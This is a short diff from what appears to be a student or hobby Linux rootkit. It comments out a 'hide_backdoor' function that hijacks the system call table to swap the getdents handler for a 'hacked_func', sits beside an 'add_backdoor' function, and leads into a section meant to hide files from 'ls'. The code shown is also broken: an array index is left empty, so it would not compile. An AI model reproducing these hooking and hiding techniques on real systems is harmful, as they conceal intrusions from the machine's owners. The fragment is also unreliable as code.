@@ -149,12 +149,13 @@ void add_backdoor(char *path) {
 		    return;
 }
 
-void hide_backdoor (void) {
+// void hide_backdoor (void) {
 	
-original_getdents = (void *)sys_call_address[];                        \
-    sys_call_address[] = (unsigned long*)&hacked_func
+// original_getdents = (void *)sys_call_address[];                        \
+//     sys_call_address[] = (unsigned long*)&hacked_func
 	
-}
+// }
+
 // End Marc
 
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
